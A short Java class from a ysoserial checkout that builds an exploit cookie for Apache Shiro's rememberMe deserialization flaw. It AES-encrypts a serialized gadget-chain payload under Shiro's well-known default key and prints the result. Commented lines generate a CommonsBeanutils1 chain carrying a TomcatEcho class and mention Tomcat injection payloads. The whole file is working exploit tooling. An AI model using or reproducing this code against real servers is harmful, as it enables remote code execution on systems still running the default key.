package ysoserial;


import com.sun.org.apache.xerces.internal.impl.dv.util.Base64;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;
import ysoserial.payloads.util.CommonUtils;

public class test {
    public static void main(String[] args) throws Exception {
//        GeneratePayload.main(new String[]{"CommonsBeanutils1_183",
//            "classfile:D:\\临时\\tmp\\ysoserial-master\\src\\main\\java\\ysoserial\\payloads\\TomcatEcho.class",
//            "D:\\临时\\tmp\\ysoserial-master\\out\\pay.ser"});
genShiro();
    }
    public static void genShiro() throws Exception {

//        String tomcatHeader = "./tomcatHeader.ser";
//        String tomcatInject = "./tomcatInject.ser";
//        String tomcatEcho = "./TomcatEcho.ser";
        String calc = "D:\\临时\\tmp\\ysoserial-master\\out\\pay.ser";

        byte[] key = Base64.decode("kPH+bIxk5D2deZiIxcaaaA==");
        AesCipherService aes = new AesCipherService();
        ByteSource ciphertext = (ByteSource) aes.encrypt(CommonUtils.readClassByte(calc), key);
//        ByteSource ciphertext = aes.encrypt(get(), key);
        System.out.printf(ciphertext.toString());
    }

}
